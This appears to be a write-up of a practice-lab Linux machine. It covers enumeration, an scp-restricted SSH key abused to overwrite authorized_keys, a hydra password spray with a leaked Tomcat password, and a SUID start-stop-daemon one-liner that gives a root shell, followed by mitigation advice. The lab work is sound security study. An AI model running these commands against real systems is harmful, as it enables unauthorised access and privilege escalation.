## Introduction
On this intermediate-level PG practice Linux machine, I discovered a **zip file containing an SSH private key** exposed in a web-accessible directory. The key was **restricted to `scp` usage only**, preventing direct SSH access. To bypass this, I generated my own **RSA key pair**, uploaded the public key to the target’s `~/.ssh/authorized_keys`, and used my private key to gain shell access. Privilege escalation was achieved via a misconfigured SUID binary (`start-stop-daemon`), which I exploited to execute commands as `root`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22 (SSH)

Version - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

We usually skip SSH.

### Port 111 (Rpcbind)

```bash
rpcclient -U "%" $IP
```

Error was NT_STATUS_CONNECTION_REFUSED

### Port 2049 (NFS)

```bash
showmount -e $IP
```

Export list for 192.168.184.100:

## Web

### Port 80

Gobuster

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

### Port 7742

![image.png](image%206.png)

![image.png](image%207.png)

That means despite provided credentials on-click it will run that function, which just alerts to the window a string `Invalid Logon`.

And no request sent to server at all, check is performed client-side.

```bash
feroxbuster -u http://$IP:7742/ -w /usr/share/wordlists/dirb/common.txt -C 403,404
```

Different one is max:

### Port 8080

Gobuster return just `manager` but access is denied.

## Exploitation

I found private key of the max, I tried connecting, but it returns the following:

![image.png](image%2010.png)

this means, that max is only allowed to run `scp` command on the target, and this private key file is supposed to be used for that.

I found in `tomcat-users.xml.bak` file a password:

![image.png](image%2012.png)

```bash
hydra -L users -p VTUD2XxJjf5LPmu6  $IP ssh
```

I tried password-spraying it with users but hydra returns the target does not support `PasswordAuthentication`.

After a bit of searching on how to use this I found that we can provide private key to `scp` command:

![image.png](image%2014.png)

I generated a new RSA key pair:

```bash
ssh-keygen -t rsa
```

I tried running this command to put public key file on the remote machine:

```bash
scp -i .ssh/id_rsa key.pub max@$IP:/home/max/.ssh/authorized_keys
```

But it kept returning me the error:

![image.png](image%2015.png)

After a bit of searching I found out this error is related to sftp and we should fallback to legacy `scp` protocol itself you can read more about it [here](https://superuser.com/questions/1733852/copy-file-using-scp-fails-debug1-exit-status-1)

```bash
scp -O -i .ssh/id_rsa key.pub max@$IP:/home/max/.ssh/authorized_keys
```

After transferring `key.pub` file I connected to the machine using private-key.

I used password identified before to get a shell as dennis user but that didn’t work.

## Privilege Escalation

I searched for SUID binaries and found `start-stop-daemon` binary has SUID bit set.

[GTFOBins-SUID-start-stop-daemon](https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid)

```bash
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

## Credentials

```bash
<role rolename="manager-gui"/>
<user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/> #found in tomcat-users.xml.bak
  
```
## Mitigation
- Never expose sensitive files like SSH keys in web-accessible locations.
- Restrict `scp` or `ssh` usage via `ForceCommand`, and monitor key usage.
- Regularly audit the system for SUID binaries and remove the bit from binaries like `start-stop-daemon` unless explicitly needed.
- Implement file integrity monitoring and strong access controls on `.ssh` directories.
